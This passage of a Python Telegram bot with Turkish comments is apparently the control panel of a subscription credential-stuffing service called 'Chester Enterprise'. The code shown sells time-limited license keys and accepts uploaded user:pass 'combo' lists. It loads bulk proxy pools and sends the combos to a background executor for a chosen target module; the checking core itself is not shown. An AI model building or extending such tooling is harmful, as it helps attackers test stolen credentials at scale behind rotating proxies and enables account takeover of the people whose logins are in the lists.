            InlineKeyboardButton("30 Günlük", callback_data="genkey_30")
        )
        kb.add(InlineKeyboardButton("🔙 Panele Dön", callback_data="adm_dashboard"))
        bot.edit_message_text("🔑 Üretmek istediğiniz lisans süresini seçin:", chat_id=chat_id, message_id=mid, reply_markup=kb)
        
    elif data.startswith("genkey_"):
        days = int(data.split("_")[1])
        new_key = f"CHESTER-{days}D-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
        
        with db_lock:
            conn = sqlite3.connect(DB_NAME, timeout=30)
            cursor = conn.cursor()
            cursor.execute("INSERT INTO keys (key_code, duration_days, status, created_by) VALUES (?, ?, 'unused', ?)",
                           (new_key, days, uid))
            conn.commit()
            conn.close()
            
        bot.send_message(chat_id, f"🔑 *Yeni Lisans Üretildi!*\n\nKod: `{new_key}`\nSüre: `{days} Gün`", parse_mode="Markdown")
        show_admin_dashboard_ui(chat_id, mid)

    # DÜZELTİLEN YENİ EK ÖZELLİKLER (BROADCAST & ADMIN ADD CALLS)
    elif data == "adm_broadcast_prompt":
        msg = bot.send_message(chat_id, "📢 Tüm bot kullanıcılarına gönderilecek yayın mesajını yazın:")
        bot.register_next_step_handler(msg, step_execute_broadcast)
        
    elif data == "adm_add_staff_prompt":
        msg = bot.send_message(chat_id, "➕ Yönetici yapılacak kişinin *Telegram ID*'sini girin:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, step_execute_add_staff)

# ======================================================================
# NEXT STEP HANDLERS (GİRDİ VE DOSYA OKUMA MOTORLARI)
# ======================================================================

def step_receive_combo_file(message):
    chat_id = message.chat.id
    uid = message.from_user.id
    target_mod = user_states.get(uid)
    
    if not target_mod:
        bot.send_message(chat_id, "⚠️ Hata: Modül seçim zaman aşımı.")
        return

    raw_data = ""
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            raw_data = downloaded.decode('utf-8', errors='ignore')
        except Exception as e:
            bot.send_message(chat_id, f"❌ Dosya okuma hatası: {str(e)}")
            return
    elif message.text:
        raw_data = message.text
    else:
        bot.send_message(chat_id, "❌ Geçersiz format! Lütfen düz yazı veya döküman iletin.")
        return

    combos = [l.strip() for l in raw_data.replace('\r', '').split('\n') if l.strip() and ":" in l]
    if not combos:
        bot.send_message(chat_id, "❌ Geçerli formatta combo bulunamadı (Örn: user:pass).")
        return

    # Arka planda kilitlenmesiz işçi havuzunu tetikle
    threading.Thread(target=core_pipeline_executor, args=(chat_id, combos, target_mod), daemon=True).start()

def step_bulk_proxy_save(message):
    chat_id = message.chat.id
    uid = message.from_user.id
    state = user_states.get(uid, "")
    
    if not state.startswith("addproxy_"): 
        return
    p_type = state.split("_")[1]
    
    raw_data = ""
    if message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            raw_data = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        except:
            bot.send_message(chat_id, "❌ Proxy dosyası okunamadı.")
            return
    elif message.text:
        raw_data = message.text
    else:
        bot.send_message(chat_id, "❌ Geçersiz proxy girdisi.")
        return

    lines = [l.strip() for l in raw_data.replace('\r', '').split('\n') if l.strip()]
    if not lines:
        bot.send_message(chat_id, "❌ Liste boş görünüyor.")
        return

    # Veritabanına sızıntısız toplu kayıt mantığı
    with db_lock:
        conn = sqlite3.connect(DB_NAME, timeout=30)
        cursor = conn.cursor()
        success_count = 0
        for line in lines:
            try:
                cursor.execute("INSERT OR IGNORE INTO proxies (proxy_str, proxy_type) VALUES (?, ?)", (line, p_type))
                if cursor.rowcount > 0:
                    success_count += 1
            except:
                pass
        conn.commit()
        conn.close()
        
    proxy_pool.reload_pool()
    bot.send_message(chat_id, f"✅ Havuza `{success_count}` adet yeni `{p_type.upper()}` proxy eklendi!\nGüncel Toplam: `{proxy_pool.get_count()}`", parse_mode="Markdown")

# --- ÇALIŞMAYAN ADMİN FONKSİYONLARININ TAM DÜZELTMELERİ ---

def step_execute_broadcast(message):
    """Admin Panelinden Broadcast (Yayın) Sistemi Düzeltildi"""
    chat_id = message.chat.id
    text_to_send = message.text
    if not text_to_send:
        bot.send_message(chat_id, "❌ Geçersiz mesaj metni, iptal edildi.")
        return
        
    with db_lock:
        conn = sqlite3.connect(DB_NAME, timeout=30)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        all_users = cursor.fetchall()
        conn.close()
        
    bot.send_message(chat_id, f"📢 `{len(all_users)}` kişiye yayın işlemi başlatılıyor...", parse_mode="Markdown")
    
    success = 0
    for row in all_users:
        target_uid = row[0]
        try:
            bot.send_message(target_uid, f"📢 *SİSTEM BİLDİRİMİ*\n\n{text_to_send}", parse_mode="Markdown")
            success += 1
            time.sleep(0.05)  # Telegram API limit koruması
        except:
            pass
            
    bot.send_message(chat_id, f"✅ Yayın tamamlandı! Başarılı iletim: `{success}/{len(all_users)}`", parse_mode="Markdown")

def step_execute_add_staff(message):
    """Yeni Yönetici/Admin Ekleme Mekanizması Tamamen Düzeltildi"""
    chat_id = message.chat.id
    input_data = message.text.strip()
    
    if not input_data.isdigit():
        bot.send_message(chat_id, "❌ Hata: Girdiğiniz değer sadece rakamlardan (Telegram ID) oluşmalıdır.")
        return
        
    target_id = int(input_data)
    with db_lock:
        conn = sqlite3.connect(DB_NAME, timeout=30)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (target_id,))
        exists = cursor.fetchone()
        
        if exists:
            cursor.execute("UPDATE users SET role = 'admin', expire_date = '2099-12-31 23:59:59' WHERE user_id = ?", (target_id,))
        else:
            cursor.execute("INSERT INTO users (user_id, username, role, expire_date) VALUES (?, 'Staff_Member', 'admin', '2099-12-31 23:59:59')", (target_id,))
            
        conn.commit()
        conn.close()
        
    bot.send_message(chat_id, f"✅ `{target_id}` ID'li kullanıcı başarıyla *ADMIN* rolüne terfi ettirildi!", parse_mode="Markdown")

# ======================================================================
# CORE POLING START SYSTEM (ANA TETİKLEYİCİ)
# ======================================================================
if __name__ == "__main__":
    print("[SYSTEM]: Chester Enterprise v4.5 Bot Altyapısı Aktif Ediliyor...")
    print(f"[SYSTEM]: Havuzdaki Toplam Kayıtlı Proxy Sayısı: {proxy_pool.get_count()}")
    print("[SYSTEM]: Bot Mesaj Dinleme Moduna Geçti. Kesintisiz Çalışma Aktif.")
    
    # Sunucu/Railway ortamlarında kesintisiz ayakta kalma ve eski bekleyen mesajları atlama (skip_pending) ayarı
    bot.infinity_polling(none_stop=True, skip_pending=True, timeout=60)

